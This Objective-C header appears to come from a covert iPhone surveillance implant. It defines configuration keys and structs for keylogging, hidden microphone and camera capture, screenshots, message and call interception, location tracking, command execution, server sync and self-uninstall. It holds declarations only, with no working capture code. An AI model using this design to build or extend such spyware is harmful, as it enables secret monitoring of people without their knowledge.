//
//  RCSIJSonConfiguration.h
//  RCSIphone
//
//  Created by kiodo on 23/02/12.
//  Copyright 2012 HT srl. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "SBJson.h"

// modules keywords
#define MODULES_KEY       @"modules"
#define MODULES_TYPE_KEY  @"module"
#define MODULES_ADDBK_KEY @"addressbook"
#define MODULES_MSGS_KEY  @"messages"
#define MODULES_POS_KEY   @"position"
#define MODULES_DEV_KEY   @"device"
#define MODULES_CLIST_KEY @"calllist"
#define MODULES_CALL_KEY  @"call"
#define MODULES_CAL_KEY   @"calendar"
#define MODULES_MIC_KEY   @"mic"
#define MODULES_SNP_KEY   @"screenshot"
#define MODULES_URL_KEY   @"url"
#define MODULES_APP_KEY   @"application"
#define MODULES_KEYL_KEY  @"keylog"
#define MODULES_CLIP_KEY  @"clipboard"
#define MODULES_CAMERA_KEY    @"camera"
#define MODULES_POSITION_KEY  @"position"
#define MODULES_STATUS_KEY    @"enabled"

#define MODULE_DEVICE_APPLIST_KEY   @"list"
#define MODULE_SCRSHOT_ONLYWIN_KEY  @"onlywindow"
#define MODULE_SCRSHOT_INTERVAL_KEY @"interval"
#define MODULE_SCRSHOT_NEWWIN_KEY   @"newwindow"
#define MODULE_URL_TAKESNP_KEY      @"snapshot"
#define MODULE_MIC_AUTOSENSE_KEY @"autosense"
#define MODULE_MIC_SILENCE_KEY @"silence"
#define MODULE_MIC_THRESHOLD_KEY @"threshold"
#define MODULE_MIC_VAD_KEY @"vad"
#define MODULE_MIC_VADTHRESHOLD_KEY @"vadthreshold"

// events keywords
#define EVENTS_KEY        @"events"
#define EVENT_TYPE_KEY    @"event"
#define EVENTS_TIMER_KEY  @"timer"
#define EVENTS_PROC_KEY   @"process"
#define EVENTS_AC_KEY     @"ac"
#define EVENTS_BATT_KEY   @"battery"
#define EVENTS_AC_KEY     @"ac"
#define EVENTS_CALL_KEY   @"call"
#define EVENTS_CONN_KEY   @"connection"
#define EVENTS_POS_KEY    @"position"
#define EVENTS_STND_KEY   @"standby"
#define EVENTS_SIM_KEY    @"simchange"
#define EVENTS_SMS_KEY    @"sms"
#define EVENTS_DATE_KEY   @"date"
#define EVENTS_AFTIN_KEY  @"afterinst"
#define EVENTS_WIN_KEY    @"window"
#define EVENTS_TIMER_KEY  @"timer"
#define EVENTS_TIMER_DAYS_KEY @"days"
#define EVENTS_TIMER_DATE_KEY  @"date"
#define EVENTS_TIMER_SUBTYPE_KEY  @"subtype"
#define EVENTS_TIMER_TS_KEY       @"ts"
#define EVENTS_TIMER_TE_KEY       @"te"
#define EVENTS_TIMER_DATEFROM_KEY  @"datefrom"
#define EVENTS_TIMER_AFTERINST_KEY  @"afterinst"
#define EVENTS_TIMER_SUBTYPE_LOOP_KEY @"loop"
#define EVENTS_TIMER_SUBTYPE_STARTUP_KEY @"startup"
#define EVENTS_TIMER_SUBTYPE_DAILY_KEY @"daily"

#define EVENTS_ACTION_START_KEY   @"start"
#define EVENT_ACTION_END_KEY      @"end"
#define EVENT_ACTION_REP_KEY      @"repeat"
#define EVENT_ACTION_DELAY_KEY    @"delay"
#define EVENT_ACTION_ITER_KEY     @"iter"
#define EVENT_ENABLED_KEY         @"enabled"
#define EVENT_PROC_WINDOW_KEY     @"window"
#define EVENT_PROC_NAME_KEY       @"process"
#define EVENT_BATT_MIN_KEY        @"min"
#define EVENT_BATT_MAX_KEY        @"max"

#define ACTION_EVENT_EVENT_KEY      @"event"
#define ACTION_EVENT_STATUS_ENA_KEY @"enable"
#define ACTION_EVENT_STATUS_DIS_KEY @"disable"
#define EVENT_START       @"START"
#define EVENT_STOP        @"STOP"

// actions keywords
#define ACTIONS_KEY       @"actions"
#define ACTION_DESC_KEY   @"desc"
#define ACTION_SUBACT_KEY @"subactions"
#define ACTION_NUM_KEY    @"ACTION_NUM_KEY"
#define ACTION_TYPE_KEY   @"action"
#define ACTION_SYNC_KEY   @"synchronize"
#define ACTION_EVENT_KEY  @"event"
#define ACTION_CMD_KEY    @"execute"
#define ACTION_MODULE_KEY @"module"
#define ACTION_SMS_KEY    @"sms"
#define ACTION_LOG_KEY    @"log"
#define ACTION_UNINST_KEY @"uninstall"
#define ACTION_EVENT_STATUS_KEY @"status"
#define ACTION_CMD_COMMAND_KEY  @"command"
#define ACTION_CONCURRENT       @"concurrent"

// module actions
#define ACTION_MODULE_APPL      @"application"
#define ACTION_MODULE_CALL      @"call"
#define ACTION_MODULE_CALLLIST  @"calllist"
#define ACTION_MODULE_CAMERA    @"camera"
#define ACTION_MODULE_CHAT      @"chat"
#define ACTION_MODULE_CLIP      @"clipboard"
#define ACTION_MODULE_CONF      @"conference"
#define ACTION_MODULE_CRISIS    @"crisis"
#define ACTION_MODULE_DEV       @"device"
#define ACTION_MODULE_KEYL      @"keylog"
#define ACTION_MODULE_LIVEM     @"livemic"
#define ACTION_MODULE_MSGS      @"messages"
#define ACTION_MODULE_MIC       @"mic"
#define ACTION_MODULE_ADDB      @"addressbook"
#define ACTION_MODULE_CAL       @"calendar"
#define ACTION_MODULE_URL       @"url"
#define ACTION_MODULE_POS       @"position"
#define ACTION_MODULE_SNAPSHOT  @"screenshot"

#define ACTION_SYNC_GPRS_KEY  @"cell"
#define ACTION_SYNC_WIFI_KEY  @"wifi"
#define ACTION_SYNC_HOST_KEY  @"host"
#define ACTION_SYNC_STOP_KEY  @"stop"

#define ACTION_MODULE_STATUS_KEY  @"status"
#define ACTION_MODULE_START_KEY   @"start"
#define ACTION_MODULE_STOP_KEY    @"stop"

#define ACTION_INFO_TEXT_KEY  @"text"

#define MODULE_EMPTY_CONF     @"NO_CONFIG"
#define MODULE_UNKNOWN        0xFFFFFFFF
#define ACTION_UNKNOWN        0xFFFFFFFF
#define EVENT_UNKNOWN         0xFFFFFFFF
#define TIMER_UNKNOWN         0xFFFFFFFF
#define TIMER_100NANOSEC_PER_DAY ((int64_t) (10000000LL * 3600LL * 24LL))

// new action event
#define ACTION_EVENT          0x400d

typedef struct {
  UInt32 enabled;
  UInt32 event;
} action_event_t;

typedef struct {
  u_int detectSilence;
  u_int silenceThreshold;
} microphoneAgentStruct_t;

typedef struct {
  UInt32 timeStep;
  UInt32 numStep;
} cameraStruct_t;

typedef struct {
  u_int sleepTime;
  u_int dwTag;
  u_int grabActiveWindow; // 1 Window - 0 Entire Desktop
  u_int grabNewWindows;   // 1 TRUE onNewWindow - 0 FALSE
} screenshotAgentStruct_t;

typedef struct _process {
  u_int onClose;
  u_int lookForTitle; // 1 for Title - 0 for Process Name
  u_int nameLength;
  char name[256];     // Name is unicode here
} processStruct_t;

typedef struct _timer {
  u_int type;
  u_int loDelay;
  u_int hiDelay;
  u_int endAction;
} timerStruct_t;

typedef struct _connection {
  u_int onClose;
  u_long typeOfConnection; // 1 for Wifi - 2 for GPRS - 3 for WiFI || GPRS
} connectionStruct_t;

typedef struct _smsEvent {
  u_int phoneNumberLength;  // cString Length
  NSString *phoneNumber;    // Unicode
  u_int smsTextLength;      // cString Length
  NSString *smsText;        // Unicode
} smsStruct_t;

typedef struct _call {
  u_int onClose;
  u_int phoneNumberLength; // cString Length
  NSString *phoneNumber;   // Unicode
} callStruct_t;

typedef struct _simChange {
  u_int onClose;
} simChangeStruct;

typedef struct _ac {
  u_int onClose;
} acStruct_t;

typedef struct _batteryLevel {
  u_int onClose;
  u_int minLevel;
  u_int maxLevel;
} batteryLevelStruct_t;

typedef struct _sync {
  u_int gprsFlag;  // bit 0 = Sync ON - bit 1 = Force
  u_int wifiFlag;
  u_int serverHostLength;
  wchar_t serverHost[256];
} syncStruct_t;

typedef struct _ApnStruct {
  u_int serverHostLength;
  wchar_t *serverHost;
  u_int numAPN;
  u_int mcc;        // Mobile Country Code
  u_int mnc;        // Mobile Network Code
  u_int apnLen;     // apn host len
  unichar *apn;     // apn host null-terminated
  u_int apnUserLen; // apn username len
  unichar *apnUser; // apn username null-terminated
  u_int apnPassLen; // apn password len
  unichar *apnPass; // apn password null-terminated
} syncAPNStruct_t;


@interface SBJSonConfigDelegate : NSObject 
{
  // taskmanager properties... remove after implementation
  NSMutableArray *mEventsList;
  NSMutableArray *mActionsList;
  NSMutableArray *mAgentsList;
  
@private
  SBJsonStreamParserAdapter *adapter;
  SBJsonStreamParser        *parser;
}

- (id)init;

- (NSMutableDictionary *)initSubActions:(NSArray *)subactions forAction:(NSNumber *)actionNum;
- (void)parser:(SBJsonStreamParser *)parser foundObject:(NSDictionary *)dict;
- (void)parseAndAddActions:(NSDictionary *)dict;
- (void)parseAndAddEvents:(NSDictionary *)dict;
- (void)parseAndAddModules:(NSDictionary *)dict;

- (NSMutableArray*)getEventsFromConfiguration:(NSData*)aConfiguration;
- (NSMutableArray*)getActionsFromConfiguration:(NSData*)aConfiguration;
- (NSMutableArray*)getAgentsFromConfiguration:(NSData*)aConfiguration;
- (BOOL)run:(NSData*)aConfiguration;

- (BOOL)checkConfiguration:(NSData*)dataConfig;

@end
